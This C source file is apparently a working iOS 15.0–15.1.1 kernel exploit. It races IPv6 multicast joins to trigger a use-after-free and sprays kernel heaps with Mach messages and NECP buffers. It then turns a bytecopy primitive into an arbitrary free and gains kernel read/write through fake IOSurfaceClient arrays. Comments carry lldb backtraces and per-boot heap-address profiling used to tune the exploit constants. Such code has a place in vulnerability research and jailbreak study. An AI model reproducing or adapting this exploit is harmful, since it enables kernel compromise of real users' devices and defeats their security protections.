#include "main.h"

#include "iokit.h"
#include "IOGPU.h"
#include "IOSurfaceRoot.h"
#include "kernel_rw.h"
#include "kernel_base.h"
#include "mcast.h"
#include "necp.h"
#include "port_utils.h"
#include "spray.h"

#include <mach/mach.h>
#include <pthread.h>
#include <sys/utsname.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <unistd.h>

#include "kernel_rw.h"
#include "print.h"

#include "ENABLE_HELPER.h"

#if ENABLE_HELPER
#include "helper/offsets.h"
#include "helper/proc.h"
#include "helper/kextrw.h"
#include "helper/find_port.h"
#include "helper/find_IOSurface.h"

extern uint64_t gKernelSlide, gKernelBase;

#endif

// The ID of the IOSurface we're using.
extern uint32_t IOSurface_id;

// The user client connection to IOSurfaceRoot.
extern mach_port_t IOSurfaceRootUserClient;

io_connect_t iosurface_connect_krw;




#pragma clang diagnostic ignored "-Wdeprecated-declarations"

#define BYTECOPY_FIRST_TARGET (KHEAP_DATA_MAPPABLE_LOC + 0x3F8C - BYTECOPY_OFFSET_IPV6) // will copy over trailer size of kmsg (used for identification of which kmsg was corrupted)
#define BYTECOPY_SECOND_TARGET (KHEAP_DATA_MAPPABLE_LOC + 3 - BYTECOPY_OFFSET_IPV6) // will copy over highest byte of kmsg's message bits, turning a non-complex kmsg to a complex one if its size ends in 0x80 (MACH_MSGH_BITS_COMPLEX)
#define BYTECOPY_OFFSET_IPV6 0x28

#if ENABLE_HELPER && ENABLE_PROFILLING
#define PORTS_COUNT 0x10
#else
#define PORTS_COUNT 0x3a00 
#endif
//PORTS_COUNT... 0x9c00 - abort or double free //0x9c00 - double free //0x9c50, 0x9d00 - kernel data abort //9f00 - success a little bit? //0x9a00 0x5a00

#define KMSG_SIZE 0x3F80 // the low 0x80 byte of this size will be copied to corrupt the message bits (setting 0x80000000, MACH_MSGH_BITS_COMPLEX)
#define UAF_BUFFER_KALLOC_1664_JOIN_COUNT 64 // UaF buffer ends up in default.kalloc.1664

#define IOSURFACE_SPRAY_UCS_COUNT 10

mach_port_t notif_port = MACH_PORT_NULL;
mach_port_t *kheap_default_ports = NULL;
uint8_t *IOSurfaceClient_array_buf = NULL;
mach_port_t *kheap_data_ports = NULL;
int kheap_data_idx = -1;
int extra_frees_for_device = -1;
io_connect_t iogpu_connect = MACH_PORT_NULL;
io_connect_t iosurface_spray_ucs[IOSURFACE_SPRAY_UCS_COUNT];
uint32_t last_surf_id = 0;
uint64_t IOSurfaceRootUserClient_ptr = 0;

void spinning(void) {
    puts("Spinning here...");
    while(1) {};
}

mach_port_t get_arb_free_holder(void)
{
    int success = 0;
    
    // reliability voodoo
    for (int i = 0; i < 3; ++i)
    {
        mcast_increase_race_reliability();
        printf("Increase reliability...\n");
    }
    
    // more reliability voodoo
    pthread_attr_t pattr;
    pthread_attr_init(&pattr);
    pthread_attr_set_qos_class_np(&pattr, QOS_CLASS_USER_INITIATED, 0);
        
    // initialize refill buffer, putting the target for the bytecopy primitive there
    uint8_t *necp_buf = malloc(4096);
    *(uint64_t *)(necp_buf + 0x278) = BYTECOPY_FIRST_TARGET;
    
    printf("Start (will fail if device has not been rebooted since last run)\n");
    kheap_data_idx = -1;
    for (int iterations = 0; iterations < 255; ++iterations)
    {
        pthread_t pt1;
        pthread_t pt2;
        int s = socket(AF_INET6, SOCK_DGRAM, 0);
        int necp_fd = necp_open(0);
        
        mcast_race_sock = s;
        
        // grow the buffer on which the UaF will be triggered to default.kalloc.1664 and
        // put it at its max size before next realloc will occur
        int ip = 0;
        for (ip = 0; ip < UAF_BUFFER_KALLOC_1664_JOIN_COUNT-2; ++ip)
        {
            mcast_join_group(ip);
        }
        
        // trigger the UaF in default.kalloc.1664, perform bytecopy primitive if refill is successful
        pthread_create(&pt1, &pattr, (void *(*)(void *))mcast_join_group, (void *)(uint64_t)ip);
        pthread_create(&pt2, &pattr, (void *(*)(void *))mcast_join_group, (void *)(uint64_t)(ip + 1));
        
        // refill the UaF buffer in default.kalloc.1664 during the race
        for (int i = 0; i < 10; ++i)
        {
            spray_default_kalloc_necp(necp_fd, necp_buf, 0x318);
        }
        
        // synchronize
        pthread_join(pt1, NULL);
        pthread_join(pt2, NULL);
        
        // find out if the refill succeeded, in which case a corrupted trailer size will be returned
        // for the holder of the corrupted kmsg, which has also had its message bits corrupted
        // (0x80000000 - MACH_MSGH_BITS_COMPLEX - now set)
        {
            for (int i = 0; i < PORTS_COUNT; ++i)
            {
                int sz = port_peek_trailer_size(kheap_data_ports[i]);
                if (sz != 8)
                {
                    printf("kheap_data_idx: %08X\n", i);
                    kheap_data_idx = i;
                    break;
                }
            }
            if (kheap_data_idx != -1)
            {
                success = 1;
                break;
            }
        }

        close(s);
        printf("iteration %d\n", iterations);
    }
    
    if (!success)
    {
        printf("Failed! Run exploit only once per boot\n");
        printf("Make sure you are on iOS 15.0 - 15.1.1 and reboot to try again\n");
        exit(1);
    }
    
    free(necp_buf);
    
    return kheap_data_ports[kheap_data_idx];
}

int exploitation_init(void)
{
    // different by device, retrieve it first and fail if unsuccessful
    extra_frees_for_device = IOGPU_get_command_queue_extra_refills_needed();
    if (extra_frees_for_device == -1)
    {
        printf("Exiting early, provide correct number 1-5 in the code for this device to proceed\n");
        return 1;
    }
    
    kheap_data_ports = malloc(PORTS_COUNT * sizeof(mach_port_t));
    kheap_default_ports = malloc(PORTS_COUNT * sizeof(mach_port_t));
    mach_port_t *contained_ports = malloc(PORTS_COUNT * sizeof(mach_port_t));
    mach_port_t *ool_ports = malloc(0x10000);
    uint8_t *kheap_data_spray_buf = malloc(0x4000);
    memset(kheap_data_ports, 0, PORTS_COUNT * sizeof(mach_port_t));
    memset(kheap_default_ports, 0, PORTS_COUNT * sizeof(mach_port_t));
    memset(contained_ports, 0, PORTS_COUNT * sizeof(mach_port_t));
    memset(ool_ports, 0, 0x10000);
    memset(kheap_data_spray_buf, 0, 0x4000);
     
    // initialize the inline data
    
    // fake descriptor for free primitive
    *(uint32_t *)(kheap_data_spray_buf + sizeof(mach_msg_header_t)) = 1;
    *(uint64_t *)(kheap_data_spray_buf + sizeof(mach_msg_header_t) + sizeof(uint32_t)) = KHEAP_DEFAULT_MAPPABLE_LOC; // free primitive target
    *(uint64_t *)(kheap_data_spray_buf + sizeof(mach_msg_header_t) + sizeof(uint32_t) + sizeof(uint64_t)) = 0x00001FF802110000; // disposition, size, etc
    // align a pointer here so that when the kmsg trailer size is corrupted, this pointer
    // will after that be followed and a second bytecopy performed where it points (kmsg message bits)
    *(uint64_t *)(kheap_data_spray_buf + 0x3F64) = BYTECOPY_SECOND_TARGET;
    
    // spray large sprays to map  KHEAP_DATA_MAPPABLE_LOC and KHEAP_DEFAULT_MAPPABLE_LOC
    for (int i = 0; i < PORTS_COUNT; ++i)
    {
        // KHEAP_DEFAULT
        /*
        ks = lldb's slide - 0x110000 //idk?
        ks = lldb's slide - 0x4b4000 //vmapple
        (lldb) bt
        * thread #1, name = 'CPU0', stop reason = breakpoint 7.1
          * frame #0: 0xfffffe002887cc08 kernel.release.vmapple`kernel_memory_allocate_prot(map=0xfffffe002c8e4720, addrp=0xfffffe6019b63a48, size=16384, mask=0, flags=KMA_KOBJECT | KMA_PERMANENT | KMA_VAONLY | KMA_ZERO | KMA_KHEAP, tag=12, protection=3, max_protection=7) at vm_kern.c:276:26 [opt]
            frame #1: 0xfffffe0028838b48 kernel.release.vmapple`kernel_memory_allocate(map=<unavailable>, addrp=0xfffffe6019b63a48, size=16384, mask=0, flags=<unavailable>, tag=12) at vm_kern.c:258:9 [opt] [inlined]
            frame #2: 0xfffffe0028838b2c kernel.release.vmapple`zone_allocate_va(z=0xfffffe002adbf1d8, flags=<unavailable>) at zalloc.c:4662:8 [opt] [inlined]
            frame #3: 0xfffffe0028838930 kernel.release.vmapple`zone_expand_locked(z=<unavailable>, flags=<unavailable>, pred=(actual=0xfffffe002883c7dc kernel.release.vmapple`zalloc_needs_refill at zalloc.c:4980)) at zalloc.c:4943:11 [opt]
            frame #4: 0xfffffe002883b48c kernel.release.vmapple`zalloc_item_slow(zone=0xfffffe002adbf1d8, zstats=0xfffffe10003dc330, flags=Z_WAITOK) at zalloc.c:5880:3 [opt]
            frame #5: 0xfffffe00287e89a4 kernel.release.vmapple`zalloc_ext(zone=0xfffffe002adbf1d8, zstats=<unavailable>, flags=<unavailable>) at zalloc.c:6191:9 [opt] [inlined]
            frame #6: 0xfffffe00287e8974 kernel.release.vmapple`kalloc_ext(kheap=<unavailable>, req_size=16384, flags=<unavailable>, site=<unavailable>) at kalloc.c:1730:9 [opt] //called from FFFFFE00072122B4 (no slide) 
            frame #7: 0xfffffe00287b62b8 kernel.release.vmapple`ipc_kmsg_copyin_ool_ports_descriptor(dsc=0xfffffe150e8b5b84, user_dsc=0xfffffe150e8b5b94, is_64bit=<unavailable>, map=0xfffffe002c8e77d0, space=0xfffffe150db98380, dest=0xfffffe1510ffae40, kmsg=<unavailable>, optionp=0xfffffe6019b63d34, mr=<unavailable>) at ipc_kmsg.c:3443:9 [opt] [inlined]
            frame #8: 0xfffffe00287b6274 kernel.release.vmapple`ipc_kmsg_copyin_body(kmsg=<unavailable>, space=<unavailable>, map=0xfffffe002c8e77d0, optionp=0xfffffe6019b63d34) at ipc_kmsg.c:3831:16 [opt]
            frame #9: 0xfffffe00287b5ea0 kernel.release.vmapple`ipc_kmsg_copyin_from_user(kmsg=<unavailable>, space=<unavailable>, map=<unavailable>, priority=<unavailable>, optionp=<unavailable>, filter_nonfatal=<unavailable>) at ipc_kmsg.c:3971:8 [opt]
            frame #10: 0xfffffe00287cc29c kernel.release.vmapple`mach_msg_overwrite_trap(args=<unavailable>) at mach_msg.c:362:8 [opt]
            frame #11: 0xfffffe00288f9b2c kernel.release.vmapple`mach_syscall(state=0xfffffe1510f6ddd0) at bsd_arm64.c:276:11 [opt]
            frame #12: 0xfffffe0028902e78 kernel.release.vmapple`handle_svc(state=0xfffffe1510f6ddd0) at sleh.c:2411:3 [opt] [inlined]
            frame #13: 0xfffffe0028902e0c kernel.release.vmapple`sleh_synchronous(context=0xfffffe1510f6ddd0, esr=<unavailable>, far=5368741888) at sleh.c:743:3 [opt]
            frame #14: 0xfffffe002879479c kernel.release.vmapple`fleh_synchronous + 40
            frame #15: 0x00000001a5721954
            frame #16: 0x000000010004a168 // called _mach_msg_send from _spray_default_kalloc_ool_ports_with_data_kalloc_size (exp)
            frame #17: 0x00000001000489e8 // called _spray_default_kalloc_ool_ports from _exploitation_init
            frame #18: 0x0000000100048dbc // called _exploitation_init from _exploit_get_krw_and_kernel_base
            frame #19: 0x0000000100048ebc // called _exploit_get_krw_and_kernel_base from _main
            frame #20: 0x00000001001b50f4 

            !!! PROFILING !!!
            Get allocated address from kalloc_ext
            breakpoint at `ipc_kmsg_copyin_from_user+0x1118` which is after called kalloc_ext, `reg read x0` to determine where allocated

            1st boot
            0xfffffe2286510000
            0xfffffe22864ac000

            2nd boot
            0xfffffe2287228000
            0xfffffe2286528000
            0xfffffe2286524000
            0xfffffe2286850000
            0xfffffe228651c000

            3rd boot
            0xfffffe2286358000

            4th boot
            0xfffffe228702c000
            0xfffffe2287028000
            0xfffffe2286a5c000
            0xfffffe2287024000
            0xfffffe2286bf8000
            0xfffffe2287020000
            0xfffffe228701c000
            0xfffffe2287018000
            0xfffffe22868f0000
            0xfffffe22868ec000
            0xfffffe22868e8000

            lowest = 0xfffffe2286358000
            KHEAP_DEFAULT_MAPPABLE_LOC 
            >>> hex((0xfffffe2286358000+0x4000*0x1500) & 0xffffffffffff0000)
            '0xfffffe228b750000'
        */
        *ool_ports = port_new();
        contained_ports[i] = *ool_ports;
        mach_port_t *pp = spray_default_kalloc_ool_ports(0x10000-1, 1, ool_ports);
        kheap_default_ports[i] = pp[0];
        free(pp);
        
        // KHEAP_DATA_BUFFERS
        /*
        
        (lldb) bt
        * thread #2, name = 'CPU1', stop reason = breakpoint 10.1
          * frame #0: 0xfffffe00248f88e0 kernel.release.vmapple`kalloc_ext(kheap=0xfffffe00267ab818, req_size=16332, flags=Z_WAITOK, site=0xfffffe0026e80078) at kalloc.c:1687 [opt]
            frame #1: 0xfffffe00248c3a18 kernel.release.vmapple`ipc_kmsg_alloc(size=16264, user_descs=<unavailable>, flags=<unavailable>) at ipc_kmsg.c:1288:10 [opt]
            frame #2: 0xfffffe00248c41ec kernel.release.vmapple`ipc_kmsg_get_from_user(msg_addr=<unavailable>, size=16264, kmsgp=0xfffffe6029d5bd38) at ipc_kmsg.c:1973:9 [opt]
            frame #3: 0xfffffe00248dc26c kernel.release.vmapple`mach_msg_overwrite_trap(args=<unavailable>) at mach_msg.c:349:8 [opt]
            frame #4: 0xfffffe0024a09b2c kernel.release.vmapple`mach_syscall(state=0xfffffe15105689f0) at bsd_arm64.c:276:11 [opt]
            frame #5: 0xfffffe0024a12e78 kernel.release.vmapple`handle_svc(state=0xfffffe15105689f0) at sleh.c:2411:3 [opt] [inlined]
            frame #6: 0xfffffe0024a12e0c kernel.release.vmapple`sleh_synchronous(context=0xfffffe15105689f0, esr=<unavailable>, far=4445650944) at sleh.c:743:3 [opt]
            frame #7: 0xfffffe00248a479c kernel.release.vmapple`fleh_synchronous + 40
            frame #8: 0x00000001c2755954
            frame #9: 0x000000010264df58    // called _mach_msg_send from _spray_data_kalloc_kmsg_single
            frame #10: 0x000000010264ca2c   // called _spray_data_kalloc_kmsg_single from _exploitation_init
            frame #11: 0x000000010264cde8   // called _exploitation_init from _exploit_get_krw_and_kernel_base
            frame #12: 0x000000010264cee8   // called _exploit_get_krw_and_kernel_base from _main
            frame #13: 0x00000001029cd0f4
        (lldb) p/d 16332
        (int) 16332
        (lldb) p/x 16332
        (int) 0x00003fcc
        (lldb) x/16bx 0x000000010264df58
        0x10264df58: 0xa0 0xc3 0x5e 0xb8 0xfd 0x7b 0x43 0xa9
        0x10264df60: 0xf4 0x4f 0x42 0xa9 0xff 0x03 0x01 0x91
        (lldb) reg read x1
        x1 = 0x0000000000003fcc (KMSG_SIZE+0x4c)

        !!! PROFILING !!!
        Get allocated address from ipc_kmsg_alloc
        breakpoint at `ipc_kmsg_get_from_user+0xac` which is before call ipc_kmsg_alloc

        1st boot
        0xfffffe2286fe0000
        0xfffffe2286ffc000

        2nd boot
        0xfffffe2287460000

        3rd boot
        0xfffffe2287d54000
        0xfffffe2287d54000
        0xfffffe2287d58000
        0xfffffe2287d4c000
        0xfffffe2287d40000
        0xfffffe2287d7c000
        0xfffffe2287d88000
        0xfffffe2287d9c000

        4th boot
        0xfffffe2287608000
        0xfffffe22872f0000
        0xfffffe22872f0000
        0xfffffe2287ebc000
        0xfffffe2287edc000
        0xfffffe2287ee0000
        0xfffffe2287ee8000
        */


        kheap_data_ports[i] = spray_data_kalloc_kmsg_single(kheap_data_spray_buf, KMSG_SIZE);
    }

#if ENABLE_HELPER
    for (int i = 0; i < PORTS_COUNT; ++i)
    {
        printf("kallocated address (type: KHEAP_DEFAULT) = 0x%llx\n", find_oolports_from_port(kheap_default_ports[i]));
    }

    for (int i = 0; i < PORTS_COUNT; ++i) 
    {
        printf("kallocated address (type: KHEAP_DATA_BUFFERS) = 0x%llx\n", find_kmsgdata_from_port(kheap_data_ports[i]));
    }
#endif 

#if ENABLE_HELPER && ENABLE_PROFILLING

// FOR PROFILLING ....
    printf("[!] Try setting macro KHEAP_DATA_MAPPABLE_LOC to 0x%llx\n", (find_kmsgdata_from_port(kheap_data_ports[PORTS_COUNT-1])+(0x4000 * (0x1500))));
    printf("[!] Try setting macro KHEAP_DEFAULT_MAPPABLE_LOC to 0x%llx\n", (find_oolports_from_port(kheap_default_ports[PORTS_COUNT-1])-(0x4000 * (0x1500))));
    printf("[!] After setting macro, rerun with disable ENABLE_HELPER\n");
    while(1) {};
#endif
    
    notif_port = port_new();
    for (int i = 0; i < PORTS_COUNT; ++i)
    {
        mach_port_t prev;
        mach_port_request_notification(mach_task_self(), contained_ports[i], MACH_NOTIFY_NO_SENDERS, 0, notif_port, MACH_MSG_TYPE_MAKE_SEND_ONCE, &prev);
        mach_port_deallocate(mach_task_self(), contained_ports[i]);
    }
    
    // pre-init kernel rw
    IOSurfaceClient_array_buf = malloc(0x10000);
    kernel_rw_preinit(KHEAP_DATA_MAPPABLE_LOC - 0x4000 + 0x10, IOSurfaceClient_array_buf, 0x4000);
    
    free(contained_ports);
    free(ool_ports);
    free(kheap_data_spray_buf);
    
    return 0;
}

int exploitation_get_krw_with_arb_free(mach_port_t arb_free_holder, uint64_t *kernel_base)
{
    int fildes[10];
    pipe(fildes);
    int read_pipe = fildes[0];
    int write_pipe = fildes[1];
    
    pipe(fildes);
    int read_pipe2 = fildes[0];
    int write_pipe2 = fildes[1];
    
    uint8_t null_buf[0x10000] = {0x0};
    uint8_t msg_buf[0x10000] = {0};
    uint8_t buf41[0x10000] = {0};
    memset(buf41, 0x41, 0x10000);
    
    // alloc these before array of IOSurfaceClients becomes 0x10000
    mach_port_t iosurface_spray_ucs[IOSURFACE_SPRAY_UCS_COUNT];
    for (int i = 0; i < IOSURFACE_SPRAY_UCS_COUNT; ++i)
    {
        iosurface_spray_ucs[i] = IOSurfaceRoot_init();
    }
    
    // cause max size of arrays of IOSurfaceClients to become 0x10000
    uint32_t last_id = IOSurfaceRoot_cause_array_size_to_be_0x10000();
    
    // TODO fill 0x10000 gaps here    

    // trigger arbitrary free in kheap default
    port_destroy(arb_free_holder);
    puts("port_destory success!!!");
    // getchar();

#if ENABLE_HELPER
    //Does it actually worked that triggering arbitrary free???
    for (int i = 0; i<1; i++) {
    mach_port_t *ool_ports = malloc(0x10000);
    memset(ool_ports, 0, 0x10000);
    *ool_ports = port_new();
    mach_port_t *pp = spray_default_kalloc_ool_ports(0x10000-1, 1, ool_ports);
    // printf("spray_default_kalloc_ool_ports() work?\n"); getchar();
    mach_port_t kheap_default_port = pp[0];
    printf("[1] kallocated address (type: KHEAP_DEFAULT) by spray_default_kalloc_ool_ports once called (so, sprayed only once) = 0x%llx\n", find_oolports_from_port(kheap_default_port));
    if(find_oolports_from_port(kheap_default_port) == KHEAP_DEFAULT_MAPPABLE_LOC) {
        puts("Confirmed working arbitrary free...!");
    } else {
        puts("No...\n");
    }
    free(pp);
    spinning();
    }
    // port_destroy(kheap_default_port);
    // printf("[!] port that once sprayed has been destroyed\n");
#endif


    write(write_pipe2, buf41, 0x10000-1);

    printf("Past first refill\n");

     // find allocation at KHEAP_DEFAULT_MAPPABLE_LOC
    int orig_holder_idx = -1;
    for (uint32_t i = PORTS_COUNT-1;
         (i > 0) && port_has_msg(notif_port);
         --i)
    {
        // skip already free'd index and its adjacent locs which we'll use later
        if (i == kheap_data_idx || i == kheap_data_idx - 1 || i == kheap_data_idx - 2)
        {
            continue;
        }
        
        port_receive_msg(notif_port, msg_buf, sizeof(msg_buf));
       
        port_destroy(kheap_data_ports[i]);

        orig_holder_idx = i;
    }

    for (int i = 0; i < IOSURFACE_SPRAY_UCS_COUNT; ++i)
    {
        IOSurfaceRoot_lookup_surface(iosurface_spray_ucs[i], last_id);;
    }
    printf("orig_holder_idx %d/%d, last_id, 0x%08X\n", orig_holder_idx, PORTS_COUNT, last_id);
    getchar();

     // read out IOSurfaceClient
    read(read_pipe2, msg_buf, 0x10000-1);
    uint64_t *src = (uint64_t *)msg_buf;
    uint64_t IOSurfaceClient_ptr = src[last_id];
    printf("IOSurfaceClient ptr: %p\n", (void *)IOSurfaceClient_ptr);
    
    // point a fake IOSurfaceClient to kheap data
    uint64_t redirect[0x100];
    for (int i = 0; i < 0x100; ++i)
        redirect[i] = KHEAP_DATA_MAPPABLE_LOC - 0x4000 + 0x10;
    write(write_pipe2, redirect, 0x10000-1);
    
    // refill in kheap data
    port_destroy(kheap_data_ports[kheap_data_idx-1]);
    kheap_data_ports[kheap_data_idx-1] = MACH_PORT_NULL;
    write(write_pipe, IOSurfaceClient_array_buf, KERNEL_RW_SIZE_FAKE_ARRAY-1);

    // find krw
    printf("Find krw...\n");

    int found = 0;
    io_connect_t iosurface_connect_krw = 0;
    for (int i = 0; i < IOSURFACE_SPRAY_UCS_COUNT; ++i)
    {
        iosurface_connect_krw = iosurface_spray_ucs[i];
        
        kernel_rw_init(iosurface_connect_krw, 2, read_pipe, write_pipe);
        uint32_t orig = kread32(KHEAP_DATA_MAPPABLE_LOC - 0x8000);
        kwrite32(KHEAP_DATA_MAPPABLE_LOC - 0x8000, 0xFEED);
        uint32_t result = kread32(KHEAP_DATA_MAPPABLE_LOC - 0x8000);
        kwrite32(KHEAP_DATA_MAPPABLE_LOC - 0x8000, orig);
        if (result == 0xFEED)
        {
            printf("Test kwrite32 and kread32: %08X (should be 0000FEED) at %d\n", result, i);
            found = 1;
            break;
        }
    }
    spinning();
    
    return 0;
}

void exploitation_cleanup(void)
{
    uint64_t command_queue_loc = kread64(KHEAP_DEFAULT_MAPPABLE_LOC + 8);
    uint64_t parent_loc = kread64(command_queue_loc + 0x488);
    uint64_t namespace_loc = kread64(parent_loc + 0x88);
    
    // bump refs
    kwrite32(command_queue_loc + 0x8, 10);
    kwrite32(namespace_loc + 0x8, 10);
    
    IOServiceClose(iogpu_connect);
}

int exploit_get_krw_and_kernel_base(uint64_t *kernel_base)
{
    uint64_t _kernel_base = 0;
    
    // generic exploitation init
    if (exploitation_init() != 0)
    {
        return 1;
    }
    
    // trigger bug, get arbitrary free
    mach_port_t arb_free_holder = get_arb_free_holder();
    // printf("arb_free_holder = 0x%x\n", arb_free_holder);
    // getchar();
    
    // generic exploitation using arbitrary free
    exploitation_get_krw_with_arb_free(arb_free_holder, &_kernel_base);
    
    
    // generic exploitation cleanup (kernel r/w still active)
    exploitation_cleanup();
    
    *kernel_base = _kernel_base;
    
    return 0;
}

int exploit_go(void)
{
    uint64_t kernel_base = 0;
    
    if (exploit_get_krw_and_kernel_base(&kernel_base) != 0)
    {
        printf("Exploit failed!\n");
        return 1;
    }
    
    // test kernel r/w, read kernel base
    uint32_t mh_magic = kread32(kernel_base);
    if (mh_magic != 0xFEEDFACF)
    {
        printf("mh_magic != 0xFEEDFACF: %08X\n", mh_magic);
        return 1;
    }
    
    printf("kread32(_kernel_base) success: %08X\n", mh_magic);
    
    printf("Done\n");
    
    return 0;
}

int main(int argc, char *argv[], char *envp[]) {

#if ENABLE_HELPER
    if(kextrw_init() != 0) {
        printf("kextrw_init() failed!\n");
        while(1) {};
    }
    kextrw_get_kernel_base();
    offsets_init();

    // goto TEST;
#endif

    uint64_t kernel_base = 0;
    
    if (exploit_get_krw_and_kernel_base(&kernel_base) != 0)
    {
        printf("Exploit failed!\n");
        return 1;
    }
    
    // test kernel r/w, read kernel base
    uint32_t mh_magic = kread32(kernel_base);
    if (mh_magic != 0xFEEDFACF)
    {
        printf("mh_magic != 0xFEEDFACF: %08X\n", mh_magic);
        return 1;
    }
    
    printf("kread32(_kernel_base) success: %08X\n", mh_magic);
    
    printf("Done\n");

TEST:
    // uint64_t our_proc = proc_of_pid(getpid());
    // printf("our_proc = 0x%llx\n", our_proc);

    // uint64_t our_proc = proc_of_pid(getpid());
    // printf("our_proc = 0x%llx\n", our_proc);
    // printf("our_task = 0x%llx\n", proc_task(our_proc));

    // mach_port_t selfport = mach_task_self();
    // printf("port_kaddr = 0x%llx\n", find_port(selfport));


#if ENABLE_HELPER
    kextrw_deinit();
#endif

    return 0;
}